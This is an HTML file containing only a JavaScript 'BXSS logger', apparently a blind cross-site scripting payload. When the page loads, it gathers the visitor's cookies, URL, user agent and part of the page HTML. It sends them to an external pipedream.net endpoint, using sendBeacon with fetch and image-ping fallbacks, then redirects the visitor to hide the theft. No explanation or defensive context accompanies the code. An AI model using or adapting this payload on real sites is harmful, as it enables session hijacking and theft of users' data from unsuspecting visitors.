<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>.</title></head>
<body>
<script>
const data = {
  cookie: document.cookie,
  location: location.href,
  userAgent: navigator.userAgent,
  html: document.documentElement?.outerHTML?.slice(0, 1000),
  ts: Date.now(),
  id: Math.random().toString(36).substring(2)
};

console.log("🛰️ BXSS logger executing…");

function redirect() {
  location.href = document.referrer || location.href;
}

try {
  navigator.sendBeacon(
    "https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net",
    new Blob([JSON.stringify(data)], { type: "application/json" })
  );
  console.log("✅ sendBeacon triggered");
  setTimeout(redirect, 200);
} catch (e) {
  console.warn("⚠️ sendBeacon failed, using fetch()", e);
  fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ ...data, error: e.toString() })
  }).finally(() => {
    console.log("✅ fetch fallback done");
    setTimeout(redirect, 300);
  });

  // Fallback 3: always fire image ping
  new Image().src = "https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net/img-fallback";
}
</script>
</body>
</html>
